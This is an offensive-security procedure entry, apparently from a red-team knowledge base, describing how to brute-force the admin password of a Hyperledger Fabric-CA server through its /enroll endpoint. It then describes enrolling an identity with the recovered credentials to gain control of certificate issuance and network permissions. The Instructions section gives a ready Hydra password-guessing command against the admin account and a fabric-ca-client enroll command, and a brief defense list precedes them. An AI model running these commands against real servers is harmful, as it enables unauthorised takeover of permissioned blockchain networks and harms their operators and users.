---
id: proc-uuid-2
tags:
  - brute-force
  - credential-access
  - fabric-ca
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:30:27.229Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Password Guessing]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Brute Force Fabric-CA Admin Credentials

## Summary

This procedure exploits the lack of rate limiting on authentication attempts and unlimited enrollments (maxenrollments=-1) to brute force the admin account password, granting high-level access to manage identities and resources in the Hyperledger Fabric network.

## Description

The Fabric-CA server's default configuration allows unlimited failed login attempts on the admin account and permits external enrollments without restrictions. Attackers can use password guessing or dictionary attacks against the /enroll endpoint to obtain credentials, leading to full control over certificate issuance and network permissions. This is particularly dangerous in permissioned blockchains where admin access enables resource manipulation.

## Requirements

1. Confirmed accessible Fabric-CA server on port 7054
2. Wordlist of potential passwords (e.g., common defaults like 'adminpw')
3. Brute force tool capable of handling HTTPS POST forms

## Defense

Defensive measures and detection strategies:

- Enable rate limiting on authentication attempts (e.g., via Fabric-CA config)
- Set maxenrollments to 0 or a low positive value to restrict external enrollments
- Use strong, unique admin passwords and monitor logs for repeated failed attempts
- Deploy WAF to block brute force patterns on port 7054

## Objectives

1. Guess the admin password through repeated attempts
2. Enroll a malicious identity using obtained credentials
3. Achieve add/delete/update/query permissions in the network

## Instructions

### Step 1: Prepare Brute Force Attack

**Context**: Identify the admin username (default 'admin') and prepare a password list, targeting the enroll endpoint which lacks attempt limits.

**Command** (hydra-brute-force):
```bash
hydra -l admin -P /path/to/passwords.txt target-ip https-post-form "/enroll:username=admin&password=^PASS^:Failed to enroll":S=Success
```

> This uses Hydra to attempt passwords from the list against the enroll form. Adjust the failure string based on server response. Expected output: Successful hit when credentials match, returning an enrollment certificate.

### Step 2: Enroll and Verify Access

**Context**: Use the discovered credentials to enroll a new identity and test permissions.

**Command** (fabric-ca-enroll):
```bash
fabric-ca-client enroll -u https://admin:password@target-ip:7054 --tls.certfiles ca-cert.pem
```

> This enrolls using the Fabric-CA client. Successful output includes MSP folder with certificates, confirming access. Test by querying or registering new users.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Brute Force]]

### Sub-Techniques

- [[Password Guessing]]

## Commands Used


## Tools Used


## Tags

- brute-force
- credential-access
- fabric-ca
